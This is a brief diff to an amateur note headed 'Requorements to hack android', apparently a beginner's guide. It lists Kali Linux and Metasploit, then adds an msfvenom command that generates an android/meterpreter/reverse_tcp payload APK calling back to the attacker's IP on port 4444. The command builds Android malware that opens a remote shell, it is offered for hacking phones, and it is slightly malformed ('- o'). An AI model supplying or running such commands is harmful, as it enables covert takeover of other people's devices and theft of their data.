@@ -2,5 +2,7 @@ Requorements to hack android::::::::::
       1.kali linux os updated
        2. Havig metasploit software
         3.fast internet conecction
-Then 
- Open terminal m
+Then to hack android we need to genarate payload apk through metasploit software
+Genarate apk 
+msfvenom -p android/meterpreter/reverse_tcp LHOST=your ip adress  LPORT=4444 - o name.apk
+
